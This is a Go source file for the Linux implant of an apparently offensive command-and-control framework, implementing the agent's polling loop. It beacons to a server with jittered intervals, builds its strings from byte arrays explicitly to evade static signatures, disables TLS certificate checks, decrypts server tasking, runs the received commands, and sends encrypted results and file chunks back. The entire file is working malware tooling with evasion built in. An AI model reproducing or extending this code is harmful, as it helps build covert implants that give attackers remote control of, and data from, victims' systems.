// server/docker/payloads/Linux/polling.go

//go:build linux
// +build linux

package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Polling strings (constructed to avoid static signatures)
var (
	pollContentTypeJson  = string([]byte{0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x6a, 0x73, 0x6f, 0x6e})                   // application/json
	pollStatusKey        = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                                               // status
	pollCmdRekey         = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79})                                                                                     // rekey
	pollStatusNoCommands = string([]byte{0x6e, 0x6f, 0x5f, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x73})                                                 // no_commands
)

// Malleable field values (constructed to avoid static signatures)
var (
	MALLEABLE_REKEY_COMMAND      = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79, 0x5f, 0x72, 0x65, 0x71, 0x75, 0x69, 0x72, 0x65, 0x64})             // rekey_required
	MALLEABLE_REKEY_STATUS_FIELD = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                             // status
	MALLEABLE_REKEY_DATA_FIELD   = string([]byte{0x64, 0x61, 0x74, 0x61})                                                                         // data
	MALLEABLE_REKEY_ID_FIELD     = string([]byte{0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x5f, 0x64, 0x62, 0x5f, 0x69, 0x64})                   // command_db_id
)

// PollConfig holds the configuration for polling behavior
type PollConfig struct {
	GetURL          string
	PostURL         string
	DecryptedValues map[string]string
}

var (
	commandQueue    *CommandQueue
	resultManager   *ResultManager
	currentPolling  *sync.WaitGroup
	pollingShutdown chan struct{}
	pollingMutex    sync.Mutex
	rekeyInProgress atomic.Bool // Prevent concurrent rekey operations
)

func init() {
	commandQueue = NewCommandQueue()
	resultManager = NewResultManager()
	currentPolling = &sync.WaitGroup{}
	pollingShutdown = make(chan struct{})
}

// deriveXORKey creates the same XOR key as the server
func deriveXORKey(clientID, secret string) []byte {
	// Must match server implementation exactly
	combined := clientID + ":" + secret
	hash := sha256.Sum256([]byte(combined))
	return hash[:32]
}

// xorDecryptBytes decrypts byte array using XOR
func xorDecryptBytes(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

// tryDecryptResponse attempts to find and decrypt the XOR encrypted field
func tryDecryptResponse(rawResponse map[string]interface{}, xorKey []byte) (map[string]interface{}, error) {
	// Try each field in the response
	for _, fieldValue := range rawResponse {
		// Skip non-string fields
		strValue, ok := fieldValue.(string)
		if !ok {
			continue
		}

		// Try to base64 decode
		encrypted, err := base64.StdEncoding.DecodeString(strValue)
		if err != nil {
			continue // Not valid base64, skip
		}

		// Try to XOR decrypt
		decrypted := xorDecryptBytes(encrypted, xorKey)

		// Try to parse as JSON
		var response map[string]interface{}
		if err := json.Unmarshal(decrypted, &response); err != nil {
			continue // Not valid JSON after decryption, skip
		}

		// Check if it has expected fields (status is required)
		if _, hasStatus := response[pollStatusKey]; hasStatus {
			return response, nil
		}
	}

	return nil, fmt.Errorf(Err(E18))
}

// checkAsyncBOFResults checks for pending async BOF results (Windows only)
// This function is only compiled and called on Windows where bofJobManager exists

// calculateJitteredInterval applies jitter to the base sleep interval
func calculateJitteredInterval(baseSeconds int, jitterPercent float64, r *rand.Rand) time.Duration {
	baseInterval := time.Duration(baseSeconds) * time.Second
	jitterFactor := jitterPercent / 100.0
	maxVariation := float64(baseInterval) * jitterFactor
	variation := (r.Float64()*2 - 1) * maxVariation
	jitteredInterval := time.Duration(float64(baseInterval) + variation)
	return jitteredInterval
}

// sendResults sends encrypted results to the server
func sendResults(encryptedData string, customHeaders map[string]string) error {
	// Get current URLs dynamically
	_, postURL := handshakeManager.GetCurrentURLs()
	decryptedValues := handshakeManager.decryptedValues

	postData := struct {
		Data string `json:"data"`
	}{
		Data: encryptedData,
	}

	jsonData, err := json.Marshal(postData)
	if err != nil {
		return fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	method := decryptedValues[geKeyPostMethod]
	if method == "" {
		method = geMethodPost
	}

	req, err := http.NewRequest(method, postURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	req.Header.Set(httpHeaderContentType, pollContentTypeJson)
	req.Header.Set(httpHeaderUserAgent, decryptedValues[geKeyUserAgent])
	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
		Timeout: time.Second * 30,
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf(ErrCtx(E12, err.Error()))
	}
	defer func() {
		io.Copy(io.Discard, resp.Body) // drain body
		resp.Body.Close()              // then close
	}()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf(ErrCtx(E12, fmt.Sprintf("%d", resp.StatusCode)))
	}

	return nil
}

// doPoll performs a single poll cycle
func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
	// Get current URLs dynamically
	getURL, _ := handshakeManager.GetCurrentURLs()
	decryptedValues := handshakeManager.decryptedValues

	method := decryptedValues[geKeyGetMethod]
	if method == "" {
		method = geMethodGet
	}

	req, err := http.NewRequest(method, getURL, nil)
	if err != nil {
		return fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	req.Header.Set(httpHeaderUserAgent, decryptedValues[geKeyUserAgent])
	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	// Create HTTP client with TLS config
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
		Timeout: time.Second * 30,
	}

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf(ErrCtx(E12, err.Error()))
	}
	defer func() {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	// First try to parse as raw JSON
	var rawResponse map[string]interface{}
	if err := json.Unmarshal(body, &rawResponse); err != nil {
		return fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Use a generic response map instead of struct to support malleable field names
	var responseMap map[string]interface{}

	// Check if this is an XOR encrypted response
	// Try to detect by checking if the malleable status field exists
	if _, hasStatus := rawResponse[MALLEABLE_REKEY_STATUS_FIELD]; !hasStatus && len(rawResponse) > 0 {
		// Likely encrypted, try to decrypt

		// Get current secret from secureComms
		currentSecret := secureComms.secret1 // Direct access to field
		xorKey := deriveXORKey(clientID, currentSecret)

		decryptedMap, err := tryDecryptResponse(rawResponse, xorKey)
		if err != nil {
			// Couldn't decrypt, use raw response
			responseMap = rawResponse
		} else {
			// Successfully decrypted
			responseMap = decryptedMap
		}
	} else {
		// Unencrypted response
		responseMap = rawResponse
	}

	// Extract values using malleable field names
	var responseStatus string
	var responseData string
	var responseCommandDBID interface{}

	if statusVal, ok := responseMap[MALLEABLE_REKEY_STATUS_FIELD]; ok {
		if s, ok := statusVal.(string); ok {
			responseStatus = s
		}
	}
	if dataVal, ok := responseMap[MALLEABLE_REKEY_DATA_FIELD]; ok {
		if d, ok := dataVal.(string); ok {
			responseData = d
		}
	}
	if cmdIDVal, ok := responseMap[MALLEABLE_REKEY_ID_FIELD]; ok {
		responseCommandDBID = cmdIDVal
	}

	// Check for rekey command (special status that doesn't require decryption)
	// Debug: Print the compile-time MALLEABLE_REKEY_COMMAND value
	//fmt.Printf("[DEBUG] MALLEABLE_REKEY_COMMAND compiled value: %q\n", MALLEABLE_REKEY_COMMAND)
	//fmt.Printf("[DEBUG] response status from server: %q\n", responseStatus)
	if responseStatus == MALLEABLE_REKEY_COMMAND {
		//fmt.Println("[DEBUG] Received rekey command from server - MATCH FOUND!")

		// Extract command DB ID for the rekey result
		var commandDBID int
		switch v := responseCommandDBID.(type) {
		case float64:
			commandDBID = int(v)
		case int:
			commandDBID = v
		case string:
			commandDBID, _ = strconv.Atoi(v)
		}

		// Execute rekey command directly without decryption
		//fmt.Println("[DEBUG] Executing rekey command...")

		// Create result for the rekey command first (before triggering rekey)
		rekeyResult := &CommandResult{
			Command: Command{
				Command:     pollCmdRekey,
				CommandDBID: commandDBID,
				AgentID:     clientID,
			},
			CompletedAt: time.Now().Format(time.RFC3339),
			Output:      Succ(S15),
			ExitCode:    0,
		}

		// Queue the result to be sent back
		if err := resultManager.AddResult(rekeyResult); err != nil {
		} else {
		}

		// Perform handshake refresh in a separate goroutine to avoid deadlock
		// Use atomic flag to prevent multiple concurrent rekey operations
		if rekeyInProgress.CompareAndSwap(false, true) {
			go func() {
				defer rekeyInProgress.Store(false)
				//fmt.Println("[DEBUG] Starting rekey in background...")
				if err := refreshHandshake(); err != nil {
				} else {
					//fmt.Println("[DEBUG] Rekey completed successfully")
				}
			}()
		}

		// Return immediately - the new goroutine will handle the rekey
		// This allows the current polling goroutine to exit cleanly
		return fmt.Errorf(Err(E19))
	}

	// Check for no commands
	if responseStatus == pollStatusNoCommands {
		return nil
	}

	// Normal encrypted command processing
	if responseData != "" {
		decrypted, err := secureComms.DecryptMessage(responseData)
		if err != nil {
			// Log decryption failure which might indicate key desync
			//fmt.Println("[DEBUG] Key desync detected - initiating automatic rekey")

			// Automatically trigger rekey in background
			// Use atomic flag to prevent multiple concurrent rekey operations
			if rekeyInProgress.CompareAndSwap(false, true) {
				go func() {
					defer rekeyInProgress.Store(false)
					//fmt.Println("[DEBUG] Starting automatic rekey due to decryption failure...")
					if rekeyErr := refreshHandshake(); rekeyErr != nil {
					} else {
						//fmt.Println("[DEBUG] Automatic rekey completed successfully")
					}
				}()
			}

			// Return nil instead of error to prevent cascading failures
			// The rekey will restart polling with fresh keys
			return nil
		}

		//fmt.Printf("[DEBUG] Decrypted command data from server: %s\n", decrypted)

		if err := commandQueue.AddCommands(decrypted); err != nil {
			//return fmt.Errorf("failed to queue commands: %v", err)
		}

		// Process commands
		//fmt.Println("[DEBUG] Starting to process commands...")
		for {
			result, err := commandQueue.ProcessNextCommand()
			if err != nil {
				continue
			}
			if result == nil {
				//fmt.Println("[DEBUG] No more commands to process")
				break
			}
			/*
			 */
			if err := resultManager.AddResult(result); err != nil {
			} else {
			}
		}
		//fmt.Println("[DEBUG] Command processing complete, rotating secret")
		secureComms.RotateSecret()
	}

	return nil
}

// startPolling initializes and starts the polling routine
func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
	secureComms := handshakeManager.GetSecureComms()
	if secureComms == nil {
		secureComms = NewSecureComms(
			handshakeManager.decryptedValues[geKeySecret],
			sysInfo.AgentInfo.Seed,
		)
	}

	pollingMutex.Lock()
	pollingShutdown = make(chan struct{})
	pollingMutex.Unlock()

	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	customHeaders, err := parseCustomHeaders(handshakeManager.decryptedValues[geKeyCustomHeaders])
	if err != nil {
		return fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Add to WaitGroup before starting goroutine
	currentPolling.Add(1)

	go func() {
		// Ensure we call Done when goroutine exits
		defer currentPolling.Done()

		consecutiveErrors := 0
		maxBackoffMultiplier := 5

		// Add label for outer loop
	pollingLoop:
		for {
			// Check for shutdown signal at the start of each iteration
			select {
			case <-pollingShutdown:
				//fmt.Println("Polling shutdown signal received, exiting polling loop")
				return
			default:
				// Continue with polling
			}

			// Get current sleep and jitter values at start of each iteration
			baseSeconds, err := strconv.Atoi(sleep)
			if err != nil {
				baseSeconds = 30 // Default to 30 seconds if invalid
			}

			// Get current jitter value
			jitterValue, err := strconv.ParseFloat(jitter, 64)
			if err != nil {
				jitterValue = 10.0 // Default to 10% if invalid
			}

			nextInterval := calculateJitteredInterval(baseSeconds, jitterValue, r)
			if consecutiveErrors > 0 {
				backoffMultiplier := math.Min(float64(consecutiveErrors), float64(maxBackoffMultiplier))
				backoffInterval := time.Duration(float64(nextInterval) * math.Pow(2, backoffMultiplier))
				nextInterval = backoffInterval
			}

			// Handle pending results before sleep
			if resultManager.HasResults() {
				results := resultManager.GetPendingResults()
				if len(results) > 0 {
					encryptedData := struct {
						AgentID string            `json:"agent_id"`
						Results []CommandResponse `json:"results"`
					}{
						AgentID: clientID,
						Results: results,
					}
					//fmt.Println("\n=== Outgoing Command Queue Before Encryption ===")
					jsonData, err := json.Marshal(encryptedData)
					if err != nil {
					} else {
						// ADD DEBUG TO SHOW JSON STRUCTURE
						preview := string(jsonData)
						if len(preview) > 500 {
							preview = preview[:500] + "..."
						}

						//fmt.Println(string(jsonData))
						encrypted, err := secureComms.EncryptMessage(string(jsonData))
						if err != nil {
						} else {
							// Updated call - no config parameter
							if err := sendResults(encrypted, customHeaders); err != nil {
							} else {
								// Only cleanup after confirmed send
								for _, result := range results {
									if result.CurrentChunk > 0 && result.CurrentChunk == result.TotalChunks {
										commandQueue.mu.Lock()
										if _, exists := commandQueue.activeDownloads[result.Filename]; exists {
											delete(commandQueue.activeDownloads, result.Filename)
										}
										commandQueue.mu.Unlock()
									}
								}
								secureComms.RotateSecret()
							}
						}
					}
				}
			}

			// Check for shutdown before sleep
			select {
			case <-pollingShutdown:
				//fmt.Println("Polling shutdown requested before sleep, exiting...")
				return
			case <-time.After(nextInterval):
				// Continue with next poll
			}

			// Perform the poll AFTER sleep
			if err := doPoll(secureComms, customHeaders); err != nil {
				// Check if this is a rekey in progress - if so, exit the entire goroutine
				if err.Error() == E19 {
					//fmt.Println("Rekey initiated, exiting current polling loop")
					break pollingLoop // Break out of the outer for loop
				}
				// Check for decryption failures
				if strings.Contains(err.Error(), E18) {
					// Could trigger automatic rekey here if needed
				}
				consecutiveErrors++
			} else {
				consecutiveErrors = 0
			}
		}
	}()

	return nil
}

// StopPolling signals the current polling routine to stop and waits for it to finish
func StopPolling() {
	//fmt.Println("Stopping current polling routine...")

	pollingMutex.Lock()
	if pollingShutdown != nil {
		close(pollingShutdown)
		pollingShutdown = nil // Set to nil instead of creating new channel
	}
	pollingMutex.Unlock()

	// Wait with timeout to prevent hanging
	done := make(chan struct{})
	go func() {
		currentPolling.Wait()
		close(done)
	}()

	select {
	case <-done:
		//fmt.Println("Polling routine stopped successfully")
	case <-time.After(10 * time.Second):
		//fmt.Println("Warning: Polling routine stop timed out after 10 seconds")
	}

	// Reset only the WaitGroup, NOT the channel
	pollingMutex.Lock()
	currentPolling = &sync.WaitGroup{}
	// Don't recreate pollingShutdown here - leave it nil
	pollingMutex.Unlock()
}
